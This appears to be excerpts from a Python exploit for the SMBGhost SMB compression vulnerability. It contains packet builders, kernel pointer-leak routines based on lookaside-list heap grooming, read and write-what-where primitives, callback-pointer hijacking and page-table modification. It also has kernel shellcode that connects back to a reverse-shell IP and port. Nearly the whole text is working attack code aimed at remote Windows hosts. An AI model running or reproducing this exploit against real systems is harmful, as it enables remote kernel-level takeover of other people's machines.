...
class Smb2NegotiateRequest:
    ...
    def compression_context(self):
        ...
        return (
            context_header + compression_algorithm_count + padding + flags + algorithms
        )
...
class Smb2NtlmAuthenticate:
    def __init__(
        ...
        timestamp,
        computer_name=b"",
        no_nt_challenge_trailing_reserved=False,
        padding=b"",
    ):
        self.signature = b"NTLMSSP\x00"
        ...
        self.nt_challenge_response_buffer_offset = struct.pack(
            "<I", 0x58 + len(padding)
        )
    ...
    def nt_challenge_response(self):
        ...
        ntlmv2_client_challenge_computer_name = (
            b"\x01\x00"
            + struct.pack("<H", len(self.computer_name))
            + self.computer_name
        )
    ...
    def get_packet(self):
        ...
        self.nt_challenge_response_max_len = struct.pack(
            "<H", len(nt_challenge_response)
        )
        return (
            self.signature
            + self.message_type
...
def send_compressed(sock, data, offset, original_decompressed_size):
    compressed = Smb2CompressedTransformHeader(
        data, offset, original_decompressed_size
    ).get_packet()
...
def is_target_vulnerable(ip_address):
    ...
    return (
        connect_and_send_compressed(
            ip_address, session_setup + b"\x00" * 16, len(session_setup), -1
        )
        != None
    )


def connect_and_send_compressed_multiple_times(
    ip_address, data, offset, original_decompressed_size
):
...
def connect_and_send_compressed_multiple_times_multithreaded(
    ip_address, data, offset, original_decompressed_size
):
...
def leak_if_ptr_byte_larger_than_value(
    ip_address, byte_offset, ptr_list, compare_to_byte
):
    ...
    original_decompressed_size = (
        ptr_list - offset
    )  # will be decompressed to target-sized lookaside list
    data = b"B" * offset + compress(payload)
    data += b"\xff" * (
        0x4101 - len(data)
    )  # request will go to 0x8100-sized lookaside list
    connect_and_send_compressed_multiple_times(
        ip_address, data, offset, original_decompressed_size
    )
    ...
    data = session_setup
    data += b"B" * (
        prev_ptr_list + 1 - 0x10 - len(data)
    )  # request will go to target-sized lookaside list
    offset = byte_offset - 0x60
    original_decompressed_size = (
        0x4101 - offset
    )  # will be decompressed to 0x8100-sized lookaside list

    reply = connect_and_send_compressed(
        ip_address, data, offset, original_decompressed_size
    )
    send_count = 1
...
def leak_ptr_byte(ip_address, byte_offset, ptr_list):
    ...
    while True:
        ...
        while low < high:
            mid = (low + high) // 2
            if leak_if_ptr_byte_larger_than_value(
                ip_address, byte_offset, ptr_list, mid
            ):
                low = mid + 1
        ...
        if low > 0 and not leak_if_ptr_byte_larger_than_value(
            ip_address, byte_offset, ptr_list, low - 1
        ):
            print(" ... ", end="", flush=True)
            continue  # something is wrong, try again
...
def prepare_allocation_pool_ptr_to_leak(ip_address):
    ...
    offset = 0
    original_decompressed_size = (
        0x10  # will be decompressed to 0x1100-sized lookaside list
    )
    connect_and_send_compressed_multiple_times_multithreaded(
        ip_address, data, offset, original_decompressed_size
    )
    ...
    offset = (
        -0x10 + 0x2100 + 0x26
    )  # will be decompressed to 0x4100-sized lookaside list
...
def prepare_internet_connection_ptr_to_leak(ip_address):
    ...
    original_decompressed_size = (
        0x2B  # will be decompressed to 0x2100-sized lookaside list
    )
    connect_and_send_compressed_multiple_times_multithreaded(
        ip_address, data, offset, original_decompressed_size
    )
...
def leak_internet_connection_object_ptr(ip_address):
    while True:
        ptr_offset, ptr_list, sock_to_keep_alive = (
            prepare_internet_connection_ptr_to_leak(ip_address)
        )
        address = leak_ptr(ip_address, ptr_offset, ptr_list)
...
def leak_ptr_with_mdl_ptrs(ip_address, allocation_pool_object_ptr, ptr_address):
    ...
    connect_and_send_compressed_multiple_times_multithreaded(
        ip_address, b"\x00" * 0x2000, 0, 0x100
    )

    mdl1_ptr = ptr_address - 0x18  # will be used for reading, align with MappedSystemVa
    mdl2_ptr = (
        allocation_pool_object_ptr + write_destination_offset
    ...
    data = (
        b"A" * offset + data + b"\xff" * 0x10
    )  # request will go to 0x20100-sized lookaside list
    original_decompressed_size = (
        0x10100 - offset
    )  # will be decompressed to 0x10100-sized lookaside list
    connect_and_send_compressed_multiple_times_multithreaded(
        ip_address, data, offset, original_decompressed_size
    )
...
def leak_srvnet_base_ptr(ip_address, allocation_pool_object_ptr):
    while True:
        internet_connection_object_ptr, _ = leak_internet_connection_object_ptr(
            ip_address
        )
        print(
            f"Leaked internet connection object address: {hex(internet_connection_object_ptr)}"
        )

        address1 = leak_ptr_with_mdl_ptrs(
            ip_address,
            allocation_pool_object_ptr,
            internet_connection_object_ptr - 0x58 + 0x100,
        )
        if address1 != None:
            address2 = leak_ptr_with_mdl_ptrs(
                ip_address, allocation_pool_object_ptr, address1 + 0x30
            )
            if address2 != None:
...
def call_function(ip_address, callback_ptr_address, arg1=None, arg2=None):
    internet_connection_object_ptr, internet_connection_sock = (
        leak_internet_connection_object_ptr(ip_address)
    )
    print(
        f"Leaked internet connection object address: {hex(internet_connection_object_ptr)}"
    )
    ...
    write_what_where(
        ip_address,
        struct.pack("<Q", callback_ptr_address - 0x08),
        internet_connection_object_ptr - 0x58 + 0x118,
    )
    ...
    if arg1 != None:
        write_what_where(
            ip_address,
            struct.pack("<Q", arg1),
            internet_connection_object_ptr - 0x58 + 0x128,
        )
    ...
    if arg2 != None:
        write_what_where(
            ip_address,
            struct.pack("<Q", arg2),
            internet_connection_object_ptr - 0x58 + 0x130,
        )
    ...
    session_setup = Smb2SessionSetupRequest(2, ntlm_negotiate, session_id).get_packet()
    compressed = Smb2CompressedTransformHeader(
        session_setup, 0, len(session_setup)
    ).get_packet()
    packet = NetBIOSWrapper(compressed).get_packet()
    internet_connection_sock.send(packet)


def read_what_where_once(
    ip_address, srvnet_base_ptr, allocation_pool_object_ptr, size, where
):
    ...
    data = struct.pack(
        ...
        size,
        0,
        allocation_pool_object_ptr + data_offset + 0x20 + len(sentinel),
    )  # dest unicode string
    ...
    write_what_where(
        ip_address,
        sentinel,
        allocation_pool_object_ptr + data_offset + 0x20 + len(sentinel) + size,
    )
...
def smbghost_kshellcode_x64(ip, port):
    ...
    umode += (
        b"\x00" + struct.pack(">H", port) + socket.inet_aton(ip) + b"\x41\x54\x49\x89"
    )
...
def exploit(ip_address, reverse_shell_ip, reverse_shell_port):
    ...
    address = read_what_where(
        ip_address, srvnet_base_ptr, allocation_pool_object_ptr, 6, read_address
    )
    ...
    pte_bits = read_what_where(
        ip_address, srvnet_base_ptr, allocation_pool_object_ptr, 1, modify_address
    )
